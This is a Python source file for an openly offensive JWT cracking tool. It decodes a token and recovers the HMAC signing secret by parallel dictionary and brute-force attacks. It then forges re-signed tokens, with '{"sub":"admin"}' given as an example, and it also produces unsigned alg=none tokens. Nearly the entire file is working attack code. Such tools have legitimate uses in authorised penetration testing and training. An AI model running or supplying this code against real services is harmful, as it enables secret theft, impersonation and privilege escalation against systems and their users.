#!/usr/bin/env python3
"""
JWT Cracker
Author: Karthik P (https://github.com/karthikparambil/jwt-crack)
  python3 jwt_cracker.py <TOKEN>
  python3 jwt_cracker.py <TOKEN> -t 3
  python3 jwt_cracker.py <TOKEN> --forge
  python3 jwt_cracker.py <TOKEN> --forge '{"sub":"admin"}'
"""

import argparse, base64, hashlib, hmac as hmac_lib, itertools
import json, multiprocessing, signal, string, sys, time
from concurrent.futures import ProcessPoolExecutor, as_completed
from rich.progress import MofNCompleteColumn
from datetime import datetime, timezone
from pathlib import Path

try:
    from rich.console import Console
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TextColumn, TimeRemainingColumn, TaskProgressColumn)
    from rich.syntax import Syntax
    from rich.markup import escape
    from rich.rule import Rule
    from rich.table import Table
    from rich import box
except ImportError:
    print("[!] pip3 install rich --break-system-packages"); sys.exit(1)

WIDTH = 62
c = Console(highlight=False)

ALGO_MAP  = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
WORDLISTS = [str(Path(__file__).parent / "jwt_wordlist.txt"),
             "/usr/share/wordlists/rockyou.txt"]

BANNER = """
   ╔╦╗ ╦ ╦ ╔╦╗   ╔═╗ ╦═╗ ╔═╗ ╔═╗ ╦╔═ ╔═╗ ╦═╗
    ║  ║║║  ║    ║   ╠╦╝ ╠═╣ ║   ╠╩╗ ║╣  ╠╦╝
  ╚═╝  ╚╩╝  ╩    ╚═╝ ╩╚═ ╩ ╩ ╚═╝ ╩ ╚ ╚═╝ ╩╚═
"""
# ── helpers ───────────────────────────────────────────────────────────
def b64d(s):
    s = s.replace("-","+").replace("_","/") + "="*(4-len(s)%4)
    return base64.b64decode(s)

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def ts(v):
    try: return datetime.fromtimestamp(int(v), tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    except: return str(v)

def parse(token):
    p = token.strip().split(".")
    if len(p) != 3: return None, None, "Not a JWT (need 3 parts)"
    try:    hdr = json.loads(b64d(p[0]))
    except: return None, None, "Bad header"
    try:    pay = json.loads(b64d(p[1]))
    except: pay = {}
    return hdr, pay, None

def _verify(token, secret, alg):
    try:
        p   = token.split(".")
        sig = hmac_lib.new(secret.encode("utf-8","replace"),
                           f"{p[0]}.{p[1]}".encode(), ALGO_MAP[alg]).digest()
        return hmac_lib.compare_digest(b64e(sig), p[2])
    except: return False

def sign(hdr, pay, secret, alg):
    eh = b64e(json.dumps(hdr, separators=(",",":")).encode())
    ep = b64e(json.dumps(pay, separators=(",",":")).encode())
    sig = hmac_lib.new(secret.encode(), f"{eh}.{ep}".encode(), ALGO_MAP[alg]).digest()
    return f"{eh}.{ep}.{b64e(sig)}"

# ── workers ───────────────────────────────────────────────────────────
def _dict_w(args):
    token, chunk, alg = args
    for line in chunk:
        s = line.rstrip("\n\r")
        if _verify(token, s, alg): return s
    return None

def _brute_w(args):
    token, cands, alg = args
    for s in cands:
        if _verify(token, s, alg): return s
    return None

# ── attacks ───────────────────────────────────────────────────────────
def dict_attack(token, alg, wl, workers, chunk=8000):
    wl_name = Path(wl).name
    total   = sum(1 for _ in open(wl, errors="ignore"))
    start   = time.time(); done = 0
    c.print(f"  [bold green]➙[/bold green] [cyan]Wordlist :[/cyan] [bright_white]{wl_name}[/bright_white]  "
            f"[cyan]Total :[/cyan] [bright_white]{total:,}[/bright_white] words")
    with Progress(
            SpinnerColumn("dots", style="green"),
            TextColumn("[green]{task.description}"),
            BarColumn(24, style="dim green", complete_style="bright_green"),
            MofNCompleteColumn(),
            TaskProgressColumn(),
            TimeRemainingColumn(),
            TextColumn("[dim]{task.fields[speed]}[/dim]"),
            console=c, transient=True) as p:
        t = p.add_task(f"[bold]Dict[/bold] [{alg}]", total=total, speed="")
        def chunks():
            buf=[]
            with open(wl, errors="ignore") as f:
                for line in f:
                    buf.append(line)
                    if len(buf)>=chunk: yield buf; buf=[]
            if buf: yield buf
        with ProcessPoolExecutor(workers, initializer=_worker_init) as ex:
            futs={ex.submit(_dict_w,(token,ch,alg)):len(ch) for ch in chunks()}
            for fut in as_completed(futs):
                n=futs[fut]; done+=n
                elapsed = time.time() - start
                kps = f"{int(done/max(elapsed,0.001)):,} k/s" if elapsed > 0.1 else ""
                p.update(t, advance=n, speed=kps)
                r=fut.result()
                if r:
                    for f in futs: f.cancel()
                    return r, done, time.time()-start
    return None, done, time.time()-start

def brute_attack(token, alg, workers, mn=1, mx=5, chunk=15000):
    cs    = string.ascii_lowercase + string.digits + "!@#$_"
    total = sum(len(cs)**l for l in range(mn, mx+1))
    start = time.time(); done = 0
    c.print(f"  [bold green]➙[/bold green] [cyan]Mode    :[/cyan] [bright_white]Brute-force[/bright_white]  "
            f"[cyan]Len :[/cyan] [bright_white]{mn}–{mx}[/bright_white]  "
            f"[cyan]Total :[/cyan] [bright_white]{total:,}[/bright_white] combos")
    with Progress(
            SpinnerColumn("dots12", style="green"),
            TextColumn("[green]{task.description}"),
            BarColumn(24, style="dim green", complete_style="bright_green"),
            MofNCompleteColumn(),
            TaskProgressColumn(),
            TimeRemainingColumn(),
            TextColumn("[dim]{task.fields[speed]}[/dim]"),
            console=c, transient=True) as p:
        t = p.add_task(f"[bold]Brute[/bold] [{alg}] {mn}–{mx}", total=total, speed="")
        def cg():
            for l in range(mn, mx+1):
                for x in itertools.product(cs, repeat=l): yield "".join(x)
        def chunks():
            buf=[]
            for x in cg():
                buf.append(x)
                if len(buf)>=chunk: yield buf; buf=[]
            if buf: yield buf
        with ProcessPoolExecutor(workers, initializer=_worker_init) as ex:
            futs={ex.submit(_brute_w,(token,ch,alg)):len(ch) for ch in chunks()}
            for fut in as_completed(futs):
                n=futs[fut]; done+=n
                elapsed = time.time() - start
                kps = f"{int(done/max(elapsed,0.001)):,} k/s" if elapsed > 0.1 else ""
                p.update(t, advance=n, speed=kps)
                r=fut.result()
                if r:
                    for f in futs: f.cancel()
                    return r, done, time.time()-start
    return None, done, time.time()-start

# ── display ───────────────────────────────────────────────────────────
SEP  = "─" * WIDTH
SEP2 = "═" * WIDTH

def sec(title):
    pad   = WIDTH - len(title) - 2
    left  = pad // 2
    right = pad - left
    c.print(f"[green]{'─'*left}[/green][bold green] {title} [/bold green][green]{'─'*right}[/green]")

def show_decoded(hdr, pay):
    sec("DECODED HEADER")
    c.print(Syntax(json.dumps(hdr, indent=2), "json",
                   theme="one-dark", background_color="default"))

    c.print()
    sec("DECODED PAYLOAD")
    c.print(Syntax(json.dumps(pay, indent=2), "json",
                   theme="one-dark", background_color="default"))

def show_info(hdr, pay):
    alg = hdr.get("alg","?").upper()
    typ = hdr.get("typ","JWT")
    now = time.time()
    c.print()
    sec("TOKEN INFO")
    c.print(f"  [cyan]Algorithm :[/cyan] [bright_green]{alg}[/bright_green]   "
            f"[cyan]Type :[/cyan] [white]{typ}[/white]   "
            f"[cyan]Sig :[/cyan] [dim]{len(hdr)}f[/dim]")

    # claims table
    tbl = Table(box=box.SIMPLE, border_style="dim green",
                show_header=True, header_style="bold green",
                show_lines=False, expand=False, width=WIDTH-4)
    tbl.add_column("Claim",  style="cyan",        no_wrap=True, min_width=10, max_width=14)
    tbl.add_column("Value",  style="bright_white", no_wrap=True, max_width=26)
    tbl.add_column("Notes",  style="yellow",       no_wrap=True, max_width=10)

    LABELS = {"sub":"subject","iss":"issuer","aud":"audience","jti":"jwt id",
              "iat":"issued at","exp":"expires","nbf":"not before"}
    for k, v in pay.items():
        val  = str(v)
        note = ""
        if k == "exp":
            val  = ts(v)
            note = "[red]EXPIRED[/red]" if v < now else "[green]valid[/green]"
        elif k in ("iat","nbf"):
            val  = ts(v)
        if k in ("admin","is_admin","root","superuser","staff","privileged") and v is True:
            note = "[red]⚠ priv[/red]"
        tbl.add_row(LABELS.get(k,k), val[:38], note)

    if "exp" not in pay:
        tbl.add_row("[yellow]exp[/yellow]","[yellow]missing[/yellow]","[yellow]no expiry[/yellow]")
    if "jti" not in pay:
        tbl.add_row("[dim]jti[/dim]","[dim]missing[/dim]","[dim]replayable[/dim]")

    c.print(tbl)

def mini_text_editor(initial_text, title="JWT Header & Payload Editor"):
    import sys, tty, termios, os, select

    lines = initial_text.splitlines()
    if not lines:
        lines = [""]

    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)

    cy, cx = 0, 0
    scroll = 0

    def get_terminal_height():
        try: return os.get_terminal_size().lines
        except: return 24

    def draw():
        sys.stdout.write("\033[H\033[J")
        c.print(f"[bold green]=== {title} ===[/bold green]")
        c.print("[dim]Edit the JSON structure below. Press Ctrl+S to save/forge, Ctrl+Q or ESC to cancel.[/dim]")
        c.print("[dim]Use arrow keys to navigate, Tab for indent (2 spaces).[/dim]")
        c.print(Rule(style="green"))

        term_height = get_terminal_height()
        max_edit_lines = max(5, term_height - 6)

        nonlocal scroll
        if cy < scroll:
            scroll = cy
        elif cy >= scroll + max_edit_lines:
            scroll = cy - max_edit_lines + 1

        for i in range(max_edit_lines):
            line_idx = scroll + i
            if line_idx < len(lines):
                line = lines[line_idx]
                prefix = f"[green]{line_idx + 1:2d} │ [/green]"
                c.print(f"{prefix}{escape(line)}")
            else:
                c.print("[dim]~[/dim]")

        c.print(Rule(style="green"))

        phys_row = 5 + (cy - scroll)
        phys_col = 6 + cx
        sys.stdout.write(f"\033[{phys_row};{phys_col}H")
        sys.stdout.flush()

    try:
        tty.setraw(fd)
        while True:
            draw()
            char = sys.stdin.read(1)

            if char == '\x13':  # Ctrl+S
                break
            elif char in ('\x11', '\x03'):  # Ctrl+Q or Ctrl+C
                return None
            elif char == '\x1b':  # Escape or arrow keys
                r, w, x = select.select([sys.stdin.fileno()], [], [], 0.05)
                if not r:
                    return None  # ESC key pressed

                c2 = sys.stdin.read(1)
                if c2 == '[':
                    c3 = sys.stdin.read(1)
                    if c3 == 'A':  # Up
                        if cy > 0:
                            cy -= 1
                            cx = min(cx, len(lines[cy]))
                    elif c3 == 'B':  # Down
                        if cy < len(lines) - 1:
                            cy += 1
                            cx = min(cx, len(lines[cy]))
                    elif c3 == 'C':  # Right
                        if cx < len(lines[cy]):
                            cx += 1
                        elif cy < len(lines) - 1:
                            cy += 1
                            cx = 0
                    elif c3 == 'D':  # Left
                        if cx > 0:
                            cx -= 1
                        elif cy > 0:
                            cy -= 1
                            cx = len(lines[cy])
                    elif c3 == '3':  # Delete key (ESC[3~)
                        sys.stdin.read(1)  # Read '~'
                        curr_line = lines[cy]
                        if cx < len(curr_line):
                            lines[cy] = curr_line[:cx] + curr_line[cx+1:]
                        elif cy < len(lines) - 1:
                            lines[cy] += lines[cy+1]
                            lines.pop(cy+1)
            elif char in ('\r', '\n'):
                curr_line = lines[cy]
                lines[cy] = curr_line[:cx]
                lines.insert(cy + 1, curr_line[cx:])
                cy += 1
                cx = 0
            elif char in ('\x7f', '\x08'):  # Backspace
                if cx > 0:
                    curr_line = lines[cy]
                    lines[cy] = curr_line[:cx-1] + curr_line[cx:]
                    cx -= 1
                elif cy > 0:
                    prev_len = len(lines[cy-1])
                    lines[cy-1] += lines[cy]
                    lines.pop(cy)
                    cy -= 1
                    cx = prev_len
            elif char == '\t':
                lines[cy] = lines[cy][:cx] + "  " + lines[cy][cx:]
                cx += 2
            else:
                if ord(char) >= 32:
                    lines[cy] = lines[cy][:cx] + char + lines[cy][cx:]
                    cx += 1
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        sys.stdout.write("\033[H\033[J")
        sys.stdout.flush()

    return "\n".join(lines)

def interactive_edit_jwt(hdr, pay):
    data = {
        "header": hdr,
        "payload": pay
    }
    initial_text = json.dumps(data, indent=2)
    current_text = initial_text

    while True:
        edited_text = mini_text_editor(current_text, title="JWT Header & Payload Editor")
        if edited_text is None:
            return None, None

        try:
            parsed = json.loads(edited_text)
            if not isinstance(parsed, dict) or "header" not in parsed or "payload" not in parsed:
                raise ValueError("JSON must contain 'header' and 'payload' keys.")
            return parsed["header"], parsed["payload"]
        except Exception as e:
            c.print()
            c.print(f"[bold red]JSON Parsing Error:[/bold red] {e}")
            c.print("[yellow]Would you like to (e)dit again or (q)uit? [e/q]: [/yellow]", end="")
            try:
                choice = input().strip().lower()
            except (KeyboardInterrupt, EOFError):
                return None, None
            if choice == 'q':
                return None, None
            current_text = edited_text

def show_forge(hdr, pay, secret, alg, payload_json=None):
    c.print()
    sec("FORGE TOKEN")
    if payload_json:
        try:
            new_pay = json.loads(payload_json)
        except:
            c.print("  [red]Invalid JSON[/red]")
            return
        new_hdr = hdr
    else:
        new_hdr, new_pay = interactive_edit_jwt(hdr, pay)
        if new_hdr is None or new_pay is None:
            c.print("  [yellow]Forging cancelled.[/yellow]\n")
            return

    # Use the algorithm specified in the forged header if present
    forge_alg = new_hdr.get("alg", alg)
    forged = sign(new_hdr, new_pay, secret, forge_alg)
    c.print(f"\n  [bold]Forged:[/bold]")
    c.print(f"  [bright_yellow]{forged}[/bright_yellow]\n")

# ── double Ctrl+C guard ───────────────────────────────────────────────
_last_sigint = 0.0
_warned      = False

def _sigint_handler(sig, frame):
    global _last_sigint, _warned
    now = time.time()
    if now - _last_sigint < 3.0:
        c.print("\n  [bold red]\u2717  Aborted.[/bold red]")
        sys.exit(1)
    if not _warned:
        _last_sigint = now
        _warned = True
        c.print("\n  [yellow]\u26a0  Press Ctrl+C again to stop\u2026[/yellow]")

def _worker_init():
    """Ignore SIGINT in worker processes — parent handles it."""
    signal.signal(signal.SIGINT, signal.SIG_IGN)

signal.signal(signal.SIGINT, _sigint_handler)

# ── main ─────────────────────────────────────────────────────────────
# ── speed tiers ───────────────────────────────────────────────────────
# Maps -t 1..5 → worker count.
# Level 5 = all available cores; lower levels throttle down gracefully.
def _resolve_workers(tier: int) -> int:
    cpu = max(1, multiprocessing.cpu_count())
    mapping = {
        1: 1,
        2: max(1, cpu // 4),
        3: max(1, cpu // 2),
        4: max(1, (cpu * 3) // 4),
        5: cpu,
    }
    return mapping.get(tier, cpu)

SPEED_LABEL = {
    1: "[dim]▒░░░░  Slow[/dim]",
    2: "[cyan]▒▒░░░  Low[/cyan]",
    3: "[yellow]▒▒▒░░  Medium[/yellow]",
    4: "[bright_green]▒▒▒▒░  Fast[/bright_green]",
    5: "[bold bright_green]▒▒▒▒▒  MAX[/bold bright_green]",
}

def main():
    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument("token", nargs="?")
    ap.add_argument("-w", "--wordlist", default=None, metavar="FILE",
                    help="Wordlist to use (default: jwt_wordlist.txt)")
    ap.add_argument("-t", "--threads", type=int, default=5, metavar="1-5",
                    help="Speed/thread tier (1=slow … 5=max, default: 5)")
    ap.add_argument("--forge", nargs="?", const="__i__", default=None, metavar="JSON")
    ap.add_argument("-h","--help", action="store_true")
    args = ap.parse_args()

    # clamp tier to valid range
    tier = max(1, min(5, args.threads))

    if args.help:
        c.print("[bold green]JWTCRACK[/bold green]")
        c.print("  python3 jwt_cracker.py <TOKEN>")
        c.print("  python3 jwt_cracker.py <TOKEN> -w custom.txt")
        c.print("  python3 jwt_cracker.py <TOKEN> -t 3          [dim]# speed 1-5[/dim]")
        c.print("  python3 jwt_cracker.py <TOKEN> --forge")
        c.print("  python3 jwt_cracker.py <TOKEN> --forge '{\"sub\":\"admin\"}'")
        return

    # banner
    c.print(f"[bold bright_green]{BANNER}[/bold bright_green]")
    c.print(Rule(style="green"))

    token = args.token or input("Token: ").strip()
    if not token: sys.exit("[!] No token")

    hdr, pay, err = parse(token)
    if err: sys.exit(f"[!] {err}")

    alg = hdr.get("alg","?").upper()

    # decoded sections
    show_decoded(hdr, pay)
    show_info(hdr, pay)

    # none alg
    if alg == "NONE":
        c.print(); sec("SIGNATURE")
        c.print("  [yellow]alg=none — unsigned token[/yellow]")
        nh = {**hdr,"alg":"none"}
        eh = b64e(json.dumps(nh,separators=(",",":")).encode())
        ep = token.split(".")[1]
        c.print(f"  [dim]Forged:[/dim] [bright_yellow]{eh}.{ep}.[/bright_yellow]")
        return

    if alg not in ALGO_MAP:
        c.print(); sec("SIGNATURE")
        c.print(f"  [red]{alg} asymmetric — cracking not supported[/red]"); return

    # cracking
    c.print()
    sec("CRACKING")
    workers = _resolve_workers(tier)
    c.print(f"  [dim]Workers : {workers}   Algorithm : {alg}[/dim]")
    c.print(f"  [dim]Speed   :[/dim] {SPEED_LABEL[tier]}")

    total_n, total_t, secret = 0, 0.0, None

    # resolve wordlist: -w flag → default list → fallback
    if args.wordlist:
        wl = args.wordlist if Path(args.wordlist).exists() else None
        if not wl:
            c.print(f"  [red]wordlist not found: {args.wordlist}[/red]")
    else:
        wl = next((p for p in WORDLISTS if Path(p).exists()), None)

    try:
        if wl:
            c.print(f"  [dim]→ dict  {Path(wl).name}[/dim]")
            secret, n, t = dict_attack(token, alg, wl, workers)
            total_n += n; total_t += t
            if not secret:
                c.print(f"  [dim]  not found ({n:,} in {t:.1f}s)[/dim]")
        else:
            c.print("  [dim]no wordlist — skipping dict[/dim]")

        if not secret:
            c.print(f"  [dim]→ brute force len 1–5[/dim]")
            secret, n, t = brute_attack(token, alg, workers)
            total_n += n; total_t += t
    except SystemExit:
        raise
    except Exception:
        pass

    # result
    c.print()
    if secret:
        speed = int(total_n / max(total_t, 0.001))
        W = WIDTH
        inner = W - 2  # inside the box borders

        # box top
        c.print(f"[bright_green]╔{'═'*inner}╗[/bright_green]")
        c.print(f"[bright_green]║[/bright_green]{'':^{inner}}[bright_green]║[/bright_green]")

        # ✓ title + secret centred
        line_text = f"✓  SECRET CRACKED! : {secret}"
        pad = max(0, inner - len(line_text))
        left = pad // 2
        right = pad - left
        c.print(f"[bright_green]║[/bright_green]{' '*left}[bold bright_green]✓  SECRET CRACKED! : [/bold bright_green][bold bright_yellow]{escape(secret)}[/bold bright_yellow]{' '*right}[bright_green]║[/bright_green]")

        c.print(f"[bright_green]║[/bright_green]{'':^{inner}}[bright_green]║[/bright_green]")
        c.print(f"[bright_green]╚{'═'*inner}╝[/bright_green]")


        if args.forge is not None:
            pj = None if args.forge == "__i__" else args.forge
            show_forge(hdr, pay, secret, alg, pj)
    else:
        sec("RESULT")
        c.print(f"  [red]✗  Not found[/red]  [dim]— {total_n:,} tried in {total_t:.2f}s[/dim]")

    c.print()

if __name__ == "__main__":
    main()
